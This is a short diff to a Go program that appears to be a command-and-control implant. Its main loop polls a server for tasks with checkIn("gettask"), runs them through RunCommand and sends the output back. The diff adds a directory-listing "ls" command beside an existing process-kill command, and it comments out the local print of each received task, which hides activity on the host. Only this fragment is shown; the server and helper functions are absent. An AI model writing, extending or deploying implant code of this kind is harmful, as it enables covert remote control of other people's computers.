@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/binary"
 	"encoding/json"
-	"fmt"
 	"io/ioutil"
 	"math/rand"
 	"net/http"
@@ -164,6 +163,12 @@ func RunCommand(command string) string {
 		} else {
 			output = string(functions.Kill(pid).Error())
 		}
+	case "ls":
+		if len(cmdArgs) < 2 {
+			output = "[!] Insufficient arguments"
+		} else {
+			output = functions.Ls(cmdArgs[1])
+		}
 	}
 
 	return output
@@ -193,7 +198,7 @@ func main(){
 	for {
 		command = checkIn("", "gettask")
 		if (len(command) > 4) {
-			fmt.Println("[*] New Task: " + command)
+			//fmt.Println("[*] New Task: " + command)
 			out = RunCommand(utils.Strip(command[4:]))
 			checkIn(utils.JsonEscape(out), "commandoutput")
 		}
